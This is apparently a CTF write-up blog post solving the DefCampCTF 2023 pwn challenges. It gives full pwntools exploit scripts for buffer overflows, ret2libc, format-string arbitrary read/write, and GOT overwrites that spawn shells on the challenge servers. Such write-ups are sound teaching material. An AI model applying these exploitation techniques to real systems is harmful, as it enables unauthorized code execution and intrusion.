---
weight: 1
title: "DefCampCTF 2023 Writeups"
date: 2023-08-24T02:05:00+07:00
lastmod: 2023-08-24T02:05:00+07:00
draft: false
author: "ItayB"
authorLink: "https://itaybel.github.io"
description: "Solutions to all of the pwn challenges and some of the forensics in the event."

tags: ["pwn", "fsb"]
categories: ["Writeups"]

lightgallery: true

toc:
  enable: true
---

Solutions to all of the pwn challenges and some of the forensics in the event.
<!--more-->

## Overview

This week , me and my team `thehackerscrew` have secured first place in this event.
I managed to solve all pwn challenges, and here I will show you my solutions.

## baby-bof

This challenges was a simple buffer overflow challenge, without any stack canary.
There was a `win` function, so I just jumped to it, by overriding the return pointer.
After running this code, we fail to win:
```py
from pwn import *

p = gdb.debug("./bof")
flag_function = 0x400767

p.sendline(b'A' * (304 + 8) + p64(flag_function))

p.interactive()

```

we can see that we get a SEGFAULT in this instruction:

` ► 0x7f263b4627f3 <buffered_vfprintf+115>    movaps xmmword ptr [rsp + 0x40], xmm0`

This happens because when we called the `win` function, the stack wasn't alligned correctly. `RSP` needs to to 16bit aligned.  To solve that, we can just jump to a single `ret` instruction before the `win` function , which will increase `RSP` by 8, and make it aligned.

Final script:

```py
from pwn import *

p = remote('34.159.182.195' , 30108 )
flag_func = 0x400767
RET = 0x4007d4
p.sendline(b'A' * (304 + 8) + p64(RET) + p64(flag_func))

p.interactive()

```

## Bistro

Bistro was the second pwn challenge in the event. we are given a simple `restaurant` binary.
When we run it, we are shown with a menu:
```
$ ./restaurant
==============================
              MENU             
==============================
1. Chessburger...............2$
2. Hamburger.................3$
3. Custom dinner............10$
>> 
```
Entering `1` or `2` calls exit. so we call `3`, which calls this function:

```c
__int64 custom()
{
  char v1[112]; // [rsp+0h] [rbp-70h] BYREF

  printf("Choose what you want to eat:");
  gets(v1);
  gets(v1);
  return 0LL;
}
```

As we can see, thats a simple buffer overflow. this is different from the first challenge, because this time there is no win function. which requires us to perform a `ret2libc` attack, to call `system` from `libc` itself.

Firstly, I took the libc file from the next challenge , `bistrov2`, which was `libc-2.27.so`.

Secondly, in order to call functions from `libc`, we would need `libc` leak.
The most known way of doing it is by crafting a `rop-chain` which calls `puts`, which is already in the binary's `got` (so we don't need a leak for that), and providing it any pointer which contains a libc address inside it.

For that, we would need a `pop rdi; ret` gadget, so we can put whatever we want inside the `rdi` register, which is the first parameter of any function, and then we can simply call `puts` and print whatever inside this pointer.

In my script, I put the got entry of `printf` into `RDI`, amd then called `puts`.

This prints us the address of the symbol `printf` inside `libc` itself, so we can just substract that constant offset, and get a leak for its base address.

After leaking, I jumped back to the `custom` function, so we can write a second stage rop chain with out leaks, and jump to system.

Here is it in my script:

```py
POPRDI = 0x00000000004008a3

p = remote('35.234.99.122' , 30407)

p.recvuntil(">> ")
p.sendline("3")
p.recvuntil("eat:")

p.sendline(b"A" * 112 + 8*b"B" + p64(POPRDI) + p64(elf.got.printf) + p64(elf.plt.puts) + p64(elf.sym.custom))

libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x64f70

print("Libc leak at", hex(libc.address))
```

Now, since we have libc, everything is easy from here.

We can trigger another buffer overflow attack, and call `system(/bin/sh)`.

One thing to notice is that somehow in the libc at the remote server, they overwrote the `/bin/sh` string in libc, to `no`.

This means we would need to write `/bin/sh` to a fixed location we know, and then calling `system` with that address.

Here is what I did in my script, I simply called `gets` into the `bss`, which we know its address:

```py
p.recvuntil("eat:")
p.sendline(b"A" * 112 + 8*b"B" + p64(POPRDI) + p64(elf.bss(0x100)) + p64(elf.sym.gets) + p64(elf.sym.custom))
p.sendline()
p.sendline("/bin/sh\x00")
```

Now, in our final stage, we are ready to call `system`!
```py
RET = 0x4008a4
p.sendline(b'A' * 112 + b'B' * 8 + p64(POPRDI) + p64(elf.bss(0x100)) + p64(RET) + p64(libc.sym["system"]))

p.sendline()
p.interactive()
```

You can see that I have added another `ret` instruction before calling to `system` because like in `baby-bof`, the stack wasn't aligned.

Here is the final script all together:
```py
from pwn import *
libc = ELF("libc.so.6")
elf = ELF("./restaurant")

POPRDI = 0x00000000004008a3

p = remote('35.234.99.122' , 30407)

p.recvuntil(">> ")
p.sendline("3")
p.recvuntil("eat:")

p.sendline(b"A" * 112 + 8*b"B" + p64(POPRDI) + p64(elf.got.printf) + p64(elf.plt.puts) + p64(elf.sym.custom))

libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x64f70

print("Libc leak at", hex(libc.address))

p.recvuntil("eat:")
p.sendline(b"A" * 112 + 8*b"B" + p64(POPRDI) + p64(elf.bss(0x100)) + p64(elf.sym.gets) + p64(elf.sym.custom))
p.sendline()

p.sendline("/bin/sh\x00")


RET = 0x4008a4
p.sendline(b'A' * 112 + b'B' * 8 + p64(POPRDI) + p64(elf.bss(0x100)) + p64(RET) + p64(libc.sym["system"]))

p.sendline()
p.interactive()
```



## BistroV2

Bistrov2 was the third pwn challenge in the event.

It was really similar to `bistro`, but now in order to reach the `restaurant` function, we need to enter the correct password, which is random.

Here is how it looks in the code:

```c
fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("Open failed");
    return -1;
  }
  else if ( read(fd, &passwd, 4uLL) == 4 )
  {
    close(fd);
    puts("Wellcome to the restaurant V2!");
    fflush(stdout);
    fgets(buff, 1024, stdin);
    printf(buff); // (1)
    puts("Show me your ticket to pass: ");
    fflush(stdout);
    __isoc99_scanf("%x", &inp);
    if ( passwd == inp )
      restaurant();
    else
      puts("Permission denied!\n");
    return 0;
  }
  ```

  As you can see, that `passwd` variable is pure random, since it is read from `/dev/urandom` , so we can't predict it.

  If we look closely, we can see that there is a Format-String-Bug in `(1)`. 

  We control `buff`, and then it gets printed with `printf`. It is known that Format string vulnerabilities make it possible to read stack memory of the vulnerable program.

  The `passwd` variable is stored in the stack, so with the FSB we can leak it and know its value!

  I saw, that by providing it with %p , 9 times, we get:

  `[b'0x6020c0', b'0x7f22babed8d0', b'0x7f22ba910151', b'0x7f22babed8c0', b'0x7f22baea9540', b'0x7ffdb6907aa8', b'0x100400760', b'0x7ffdb6907aa0', b'0x3cd376584']`

  After debugging a bit with `GDB` , I saw that the random value is `0xd376584`. we can see that its the the first element from the end, without the 2 nibbles at the start.

  We can also notice that the second element is a libc leak. this will save some time for us later.

  Here is how I extracted those values and sent the correct password in my script:

  ```py
  p = gdb.debug("./bin")
  p.recvline()

  p.sendline("%p|" * 9)

  leaks = p.recvline().split(b'|')
  rand = leaks[-2][3:] # its -2 and not -1, because there is a \n at the end

  libc.address = int(leaks[1], 16) - 0x3ed8d0 #gained this offset with gdb

  print(hex(libc.address), rand)

  p.recvline()
  p.sendline(hex(int(rand, 16)))
```

Now, we successfully entered the restaruant! from here , the challenge is exactly like `bistrov1`.

There is the same `BOF` in the `custom` function:
```py
int __cdecl custom()
{
  char buffer[100]; 

  printf("Choose what you want to eat:");
  gets(buffer);
  gets(buffer);
  return 0;
}
```

Since we already have a libc leak, we don't even need to leak libc from the got , as we did in `bistrov1`.

We can write away do out `ret2libc` attack. 

Here is my final script:

```py
from pwn import *

libc = ELF("./libc-2.27.so")

p = gdb.debug("./bin")
p.recvline()

p.sendline("%p|" * 9)

leaks = p.recvline().split(b'|')
rand = leaks[-1][3:]

libc.address = int(leaks[1], 16) - 0x3ed8d0

print(hex(libc.address), rand)

p.recvline()
p.sendline(hex(int(rand, 16)))

p.recvuntil(">> ")
p.sendline("3")

p.recvuntil("eat:")

BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
POP_RDI = 0x0000000000400b33
RET = 0x400b34
p.sendline(b"A" * 112 + 8*b"B" + p64(POP_RDI) + p64(BINSH) +p64(RET) + p64(libc.sym.system))

p.interactive()
```


## Book

Book was a simple binary which exposed 6 different functions to the user:

```
Hi a,wellcome to dashboard?
1) Print NOTE list
2) Print NOTE entry
3) Store NOTE entry
4) Delete NOTE entry
5) Remote administration
6) Exit

```

We can `store`/`print`/`delete` notes.

Lets look at the `store` function and search for vulnerabillites:
```c
int store_todo()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("In which slot would you like to store the new entry? ");
  fflush(stdout);
  idx = read_int();
  if ( idx > 128 )
    return puts("Sorry but this model only supports 128 NOTE list entries.\n");
  printf("What's your NOTE? ");
  fflush(stdout);
  return read_line(&todos[48 * idx], 48LL);
}
```

Todo is a global array, located in the bss.

There is a simple Out-Of-Bounds Write vulnerabillity here. the code doesn't check if `idx < 0`, and we can overwrite stuff before the `todos` variable.

The same vulnerabillity is inside the `print_todo` function aswell, which gives us a Out-Of-Bounds Read primitive:

```c
int print_todo()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("Which entry would you like to read? ");
  fflush(stdout);
  idx = read_int();
  if ( idx <= 128 )
    return printf("Your NOTE: %s\n", &todos[48 * idx]);
  else
    return puts("Sorry but this model only supports 128 NOTE list entries.\n");
}
```

 *Exploitation*

After running `checksec` on the binary, we can see that the binary is compiled with `Partial Relro`, and that `PIE` is enabled.
`Partial Relro` changes two things, which are important to know:
  1. It forces the `GOT` to come before the BSS in memory
  2. It marks the `GOT` as `r/w`. which means we can overwrite it

Because of these two things, we can use our OOB bug to `leak/write` `from/to` the GOT.

Firstly, lets try to leak the binary base address, which is random because of `PIE`.

Since the binary is `Partial Relro`, it will resolve libc entries on runtime, when they are called.

Before they are called, `GOT` entries will contain a binary address, which is resposible for calling `_dl_runtime_resolve_xsavec` which resolves the function in libc.

With our `OOB read`, we can leak the contents of the `GOT` entry which hasn't been called yet. in my exploit, I read the `GOT` entry of the `write` function.

I noticed that the offset of that function is `0x1040`, so I just subtracted it from my leak to get the binary base address.

Here is my leak:

```py
elf = ELF("./book")
p.sendline("name") 

def read(idx):
	p.sendline("2")
	p.recvuntil("read? ")
	p.sendline(str(idx))
	p.recvuntil("NOTE: ")	
	return p.recvline()

p = process('./book')

elf.address = u64(read(-6)[:-1].ljust(8, b'\x00'))  - 0x1040

print(hex(elf.address))
``` 

Now, what should be overwrite with out `OOB write`?

As I said earlier, the `GOT` is marked `r/w` because of `Partial Relro`.

When an external function will be called, the program will jump to what is written in the corrosponding `GOT` entry.

By using our `OOB write` primitive, we can write anything we want into the `GOT`, which gives us a complete `RIP` control!

It is worth noticing that in the `init` function, `system("mkdir note 2>/dev/null");` will be called.

Because of that, `system` will be in the `GOT`, and we can redirect code execution of any function to it, without needing to do a `ret2libc` attack.

Now, we need what we will write, but the question is where?

Our final objective is to run `system('/bin/sh')`.

To achieve that, we would need to control the first parameter of the called function.

We would need to choose a `libc` function which takes exactly 1 parameter, which we can control.

I chose `atoi`, its the perfect candidate, since it will be called with a string we control.

I saw that the `atoi` `GOT` entry is located `0xb8` bytes before our `todos` array:

```
pwndbg> got atoi
GOT protection: Partial RELRO | Found 1 GOT entries passing the filter
[0x555555558088] atoi@GLIBC_2.2.5 -> 0x555555555110 ◂— endbr64 
pwndbg> x/gx &todos
0x555555558140 <todos>:	0x0000000000000000
pwndbg> x 0x555555558140-0x555555558088
0xb8:	Cannot access memory at address 0xb8
```

The write function will write into `todos[idx * 48]`.

We can enter `idx=4`, which will write into `todos - 0xc0`. then we can provide one quadword of nullbytes, and we will reach the `GOT` entry.

Then , we will write the address of `system`, and then we can just write `/bin/sh`, which will be our menu option, and `atoi` will be called with it, and thats how you gain `RCE`.

Here is my full solve script:

```py

from pwn import *

elf = ELF("./book")
p = process('./book')

p.sendline("name") 

def read(idx):
	p.sendline("2")
	p.recvuntil("read? ")
	p.sendline(str(idx))
	p.recvuntil("NOTE: ")	
	return p.recvline()

def store(idx, content):
	p.sendline("3")

	p.sendline(str(idx))

	p.sendline(content)


elf.address = u64(read(-6)[:-1].ljust(8, b'\x00'))  - 0x1040

store(-4, p64(0) + p64(elf.sym.system))

p.sendline("/bin/sh")

p.interactive()
```

## System-leak / System-write

`System-leak` and `System-write` were the 2 last pwn challenges in the event.

They both were kind of the same, the only things different is their mitigations, and the description of `System-leak` has hinted that it will be enough to leak memory and get the flag from their.

It wasn't really important for me, since I achieved RCE for both of them, and the solution was exactly the same.

Here is the code of the challenges, decompiled using `IDA`:
```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int choice; // [rsp+0h] [rbp-220h] BYREF
  int pri; // [rsp+6h] [rbp-21Ah] BYREF
  char s[520]; // [rsp+10h] [rbp-210h] BYREF
  unsigned __int64 v6; // [rsp+218h] [rbp-8h]
  __int64 savedregs; // [rsp+220h] [rbp+0h] BYREF

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  while ( 1 )
  {
    puts("\n========== MENU ==========");
    puts("1. Write input to syslog");
    puts("2. Read syslog");
    puts("3. Exit");
    puts("==========================");
    printf("Enter your choice: ");
    __isoc99_scanf("%d", &choice);
    if ( choice == 3 )
    {
      puts("Exiting...");
      exit(0);
    }
    if ( choice > 3 )
    {
LABEL_10:
      puts("Invalid option. Try again.");
    }
    else if ( choice == 1 )
    {
      printf("Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): ");
      __isoc99_scanf(" %[^\n]", &pri);
      printf("Enter the message to write to syslog: ");
      fgets(s, 512, stdin);
      fgets(s, 512, stdin);
      syslog(pri, s);
      closelog();
    }
    else
    {
      if ( choice != 2 )
        goto LABEL_10;
      read_syslog();
    }
  }
}
```

We can use the `syslog` function, and we can read from it.

A quick `man syslog` command, shows that syslog() generates a log message, and writes it into `/var/log/syslog`.

Here is the function signature:

`void syslog(int priority, const char *format, ...);`

The second paramater is a `format string`, which we fully control. this leads to an `FSB` bug.

Since the `s` string passed to the `syslog` function is on the stack, we can gain a fully arbitrary write and read out of this bug.

We can first leak `stack addresses` and `libc addresses` from the stack with the `%p` specifier, and we can write to any location we want with the `%n` specifier.

There is no `system` on the `GOT`, so we needed to perform a `ret2libc` attack.

Since we are not given the `libc` version, we would need to figure it out ourselves.

The way I did it is by gaining an arbitrary read from our `FSB`, and then reading several entries from the `GOT`.

Then we can use a tool like `https://libc.rip/` which can find the correct libc version out of a few symbols addresses.

In order to gain an arbitrary read out of an `FSB`?

In C, when you want to use a string you use a pointer to the start of the string - this is essentially a value that represents a memory address.

So when you use the %s format specifier, it's the pointer that gets passed to it.

That means instead of reading a value of the stack, you read the value in the memory address it points at.

Firstly, since the string `s` in in the stack, we would need to understand what is its offset so we can use `%{offset}$s` in order to read from it.

I have tried to call the `syslog` function with the string `AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p`, and then I saw that `0x4141414141414141` is the 7'th `%p` specifier:

```
Enter the message to write to syslog: $ AAAAAAAABBBBBBBB|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p

========== MENU ==========
1. Write input to syslog
2. Read syslog
3. Exit
==========================

Enter your choice: $ 2
                                      (1)           (2)       (3)   (4)          (5)              (6)              (7)
Oct 22 19:25:50 itay bin: AAAAAAAA|0xcd20ef86|0x7fd09a914992|(nil)|(nil)|0x4f4c000000000001|0x4f464e495f47|0x4141414141414141|0x4242424242424242|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025
```

Now, in order to reach it we will first write our specifier, we will enter `%8$sAAAA + p64(addr)`.

Its 8 and not 7, is because we first enter 8 bytes, and then we reach the address, so its another quadword.

We add `AAAA` is because we need to pad it so that it will be 8 byte aligned.

Here is how I leaked `puts` and `printf` by reading their `GOT` entries:

```py
write(b"AAAA%8$s" + p64(elf.got.puts))

p.recvuntil("choice: ")
p.sendline("2")
p.recvuntil('AAAA')
puts = u64(p.recvn(6).ljust(8, b'\x00'))

print("puts", hex(puts))

write(b"BBBB%8$s" + p64(elf.got.printf))

p.recvuntil("choice: ")
p.sendline("2")
p.recvuntil('BBBB')
printf = u64(p.recvn(6).ljust(8, b'\x00'))

print("printf", hex(printf))

p.interactive()
```

I ran it on remote, and got 2 addresses. I gave it to `https://libc.rip/` and it found our libc, which is `libc-2.35.so`.

Now, we are ready to exploit this bug.

Firstly, with our `FSB` bug, I dumped several entries, and leaked a `stack` address.

Currently we have both `stack` leak and `libc` leak. 

We can use our `FSB` bug , to gain an arbitrary write. but what can we write into?

We have stack leak, so we can write into a saved return pointer of some function.

In my exploit, I overwrote the return pointer of the last call to `syslog` . (It's cool because `syslog` will write to its own return pointer)

In order to find its offset from our stack leak, I have set a breakpoint with `gdb` on the call to `syslog`, and saw where it is located.
Then I just substraced it with our leak, and got that its 0x340 bytes before it:

```
00:0000│ rsp 0x7ffd0706d758 —▸ 0x401635 (main+443) ◂— call 0x4010f0 ------------> here it is, in 0x7ffd0706d758
01:0008│     0x7ffd0706d760 ◂— 0x4f4c000000000001
02:0010│     0x7ffd0706d768 ◂— 0x4f464e495f47 /* 'G_INFO' */
03:0018│ rsi 0x7ffd0706d770 ◂— 0x3533256332353125 ('%152c%35')
04:0020│     0x7ffd0706d778 ◂— 0x633534256e6c6c24 ('$lln%45c')
05:0028│     0x7ffd0706d780 ◂— 0x256e686824363325 ('%36$hhn%')
06:0030│     0x7ffd0706d788 ◂— 0x6c24373325633731 ('17c%37$l')
07:0038│     0x7ffd0706d790 ◂— 0x3833256337256e6c ('ln%7c%38')

pwndbg> x 0x7ffd0706da98-0x7ffd0706d758
0x340:	Cannot access memory at address 0x340
```

Then, I used `pwntools FSB utils`, specificlly the `fmtstr_payload` function, to write to the return pointer.

With my `libc` leak, I crafted a simple `ROP chain` to jump to `system(/bin/sh)`.

Here is my final solve script:

```py
from pwn import *

context.arch = 'amd64'
elf = ELF("./bin")
libc = ELF("./libc6_2.35-0ubuntu3_amd64.so")
rop = ROP(libc)

p = gdb.debug("./bin")

def write(buf):
	p.recvuntil("choice: ")
	p.sendline("1")
	p.sendline("LOG_INFO")
	p.sendline(buf)


write("6666%p|%p|%78$p|4444")

p.recvuntil("choice: ")
p.sendline("2")
p.recvuntil("6666") # recv everything before our leaks

fsb_leaks = p.recvuntil("4444").replace(b"4444", b'').split(b"|")

libc.address = int(fsb_leaks[1], 16) - 0x114992

stack = int(fsb_leaks[-2], 16)
ret_address = stack - 0x340 

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] 
BINSH = next(libc.search(b"/bin/sh"))
RET = (rop.find_gadget(['ret']))[0] 

writes = {ret_address: POP_RDI+libc.address , ret_address+0x8: BINSH, ret_address+0x10: libc.address+RET, ret_address+0x18: libc.sym.system}

payload = fmtstr_payload(7, writes)
write(payload)

p.interactive()
```




## Appendix

The challegnes were really fun, I just wished that they were a bit harder. I am glad I was able to solo them for my team!

If you have any question regarding the above solutions, you can DM me via my [Twitter](https://x.com/itaybel) or my `Discord` (itaybel).
